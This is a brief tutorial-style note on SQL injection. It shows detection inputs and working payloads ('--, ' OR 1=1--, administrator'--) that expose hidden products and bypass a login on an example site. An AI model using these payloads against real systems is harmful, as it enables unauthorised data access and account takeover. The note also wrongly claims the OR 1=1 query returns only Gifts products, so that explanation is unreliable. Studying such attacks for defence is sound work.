# SQL Injections
## Detection
```
'
'OR 1=1+--+
'OR 1=2+--+
time-delay payloads
triggering out-of-band network interaction
```

## Examples
### Retrievieng hidden data
`https://insecure-website.com/products?category=Gifts`
When user clicks on the *Gifts* category, browser requests URL from above  
SQL query:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
Here *released* means that product is released and could be viewed by users. If we change released value to 0, we will be able to see all the products  
URL:
`https://insecure-website.com/products?category=Gifts'--`
Query:
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
Or we can use next query:
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
And the query will be:
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
1=1 returns True, so query will return all product from category *Gifts*

## Subverting application logic
If user sends login wiener and pass bluecheese, app will let him in  
Query:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
If we enter `administrator'--` we will get in as administrator without checking password, because query will be next:
`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

